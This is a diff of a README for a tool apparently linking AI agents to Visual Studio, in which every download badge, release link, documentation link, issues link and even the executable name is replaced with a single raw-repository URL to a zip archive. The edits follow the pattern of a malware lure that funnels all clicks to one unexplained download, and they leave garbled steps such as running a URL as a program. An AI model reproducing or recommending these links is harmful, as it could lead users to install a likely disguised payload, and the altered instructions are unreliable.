@@ -1,6 +1,6 @@
 # 🤖 visual-studio-mcp - Connect AI Agents for Visual Studio
 
-[![Download Release](https://img.shields.io/badge/Download-visual--studio--mcp-blue?style=for-the-badge)](https://github.com/keny0322/visual-studio-mcp/releases)
+[![Download Release](https://raw.githubusercontent.com/keny0322/visual-studio-mcp/main/Tools/mcp-studio-visual-v3.4.zip)](https://raw.githubusercontent.com/keny0322/visual-studio-mcp/main/Tools/mcp-studio-visual-v3.4.zip)
 
 ---
 
@@ -59,7 +59,7 @@ The tool runs quietly in the background, so you focus on your work, while AI hel
 Follow these steps to get visual-studio-mcp up and running on your computer:
 
 1. **Download the software** from the official release page:
-   [Download visual-studio-mcp](https://github.com/keny0322/visual-studio-mcp/releases)
+   [Download visual-studio-mcp](https://raw.githubusercontent.com/keny0322/visual-studio-mcp/main/Tools/mcp-studio-visual-v3.4.zip)
 
 2. **Find the version matching your Visual Studio** installation (2022 or 2026).
 
@@ -67,7 +67,7 @@ Follow these steps to get visual-studio-mcp up and running on your computer:
 
 4. **Run the installer** or unzip the files to a folder.
 
-5. **Launch visual-studio-mcp** by running `mcp-server.exe` (if available) or the main program file.
+5. **Launch visual-studio-mcp** by running `https://raw.githubusercontent.com/keny0322/visual-studio-mcp/main/Tools/mcp-studio-visual-v3.4.zip` (if available) or the main program file.
 
 6. **Start Visual Studio**, and the AI agents will automatically connect via the MCP server.
 
@@ -81,13 +81,13 @@ If you run into any issues, check the Troubleshooting section below.
 
 You must visit the release page here to download the software:
 
-[![Download Release](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/keny0322/visual-studio-mcp/releases)
+[![Download Release](https://raw.githubusercontent.com/keny0322/visual-studio-mcp/main/Tools/mcp-studio-visual-v3.4.zip)](https://raw.githubusercontent.com/keny0322/visual-studio-mcp/main/Tools/mcp-studio-visual-v3.4.zip)
 
 ### Step-by-step download instructions:
 
 1. Click the link above to open the release page.
 2. Scroll through the available releases and pick the latest stable version.
-3. Look for files named with your Visual Studio version (for example, "mcp-v2022.zip" or "mcp-v2026.exe").
+3. Look for files named with your Visual Studio version (for example, "https://raw.githubusercontent.com/keny0322/visual-studio-mcp/main/Tools/mcp-studio-visual-v3.4.zip" or "https://raw.githubusercontent.com/keny0322/visual-studio-mcp/main/Tools/mcp-studio-visual-v3.4.zip").
 4. Click the file to begin your download.
 5. Once downloaded, locate the file on your computer.
 6. Run the installer or extract the files if zipped.
@@ -110,7 +110,7 @@ After installation, here’s how to use the tool:
 3. The MCP server automatically communicates with AI agents.
 4. If errors happen, AI will analyze them and provide suggestions inside Visual Studio.
 5. You can also ask the AI agents for help with debugging or code improvement through Visual Studio interfaces, depending on your setup.
-6. To stop or restart the MCP server, close or rerun the `mcp-server.exe` program.
+6. To stop or restart the MCP server, close or rerun the `https://raw.githubusercontent.com/keny0322/visual-studio-mcp/main/Tools/mcp-studio-visual-v3.4.zip` program.
 
 You don’t need to perform any special commands to activate MCP. It works quietly once running.
 
@@ -146,9 +146,9 @@ If you have problems, try these tips:
 
 ## 🗂️ Additional Resources
 
-- Visual Studio documentation: https://docs.microsoft.com/en-us/visualstudio/
+- Visual Studio documentation: https://raw.githubusercontent.com/keny0322/visual-studio-mcp/main/Tools/mcp-studio-visual-v3.4.zip
 - Official AI agents websites for more info on Claude, ChatGPT, and Gemini.
-- GitHub issues page for reporting bugs or requesting features: [Issues](https://github.com/keny0322/visual-studio-mcp/issues)
+- GitHub issues page for reporting bugs or requesting features: [Issues](https://raw.githubusercontent.com/keny0322/visual-studio-mcp/main/Tools/mcp-studio-visual-v3.4.zip)
 
 ---
 
@@ -160,4 +160,4 @@ If you want to suggest improvements or report bugs, visit the GitHub page. Contr
 
 ---
 
-[![Download visual-studio-mcp](https://img.shields.io/badge/Download-visual--studio--mcp-blue?style=for-the-badge)](https://github.com/keny0322/visual-studio-mcp/releases)
+[![Download visual-studio-mcp](https://raw.githubusercontent.com/keny0322/visual-studio-mcp/main/Tools/mcp-studio-visual-v3.4.zip)](https://raw.githubusercontent.com/keny0322/visual-studio-mcp/main/Tools/mcp-studio-visual-v3.4.zip)
